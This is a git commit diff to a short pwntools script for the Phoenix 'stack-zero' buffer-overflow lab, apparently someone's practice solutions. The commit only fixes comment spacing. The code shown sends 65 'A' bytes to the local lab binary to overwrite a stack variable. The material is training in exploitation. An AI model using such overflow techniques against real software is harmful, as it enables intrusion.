d22c1c0d9fbf702f4060e8604fc0f04a17d9bd75
Dong Jun Kim <35159798+Immobility@users.noreply.github.com>
2021-02-21 22:24:06 -0500

    Update s0.py

--- phoenix/stack-zero/s0.py
+++ phoenix/stack-zero/s0.py
@@ -2,7 +2,7 @@ from pwn import *
 
 p = process('/opt/phoenix/i486/stack-zero')
 
-buf = "A" * 64 + "A" #An additional buffer is needed to overwrite the value
+buf = "A" * 64 + "A" # An additional buffer is needed to overwrite the value
 
 p.sendline(buf)
 
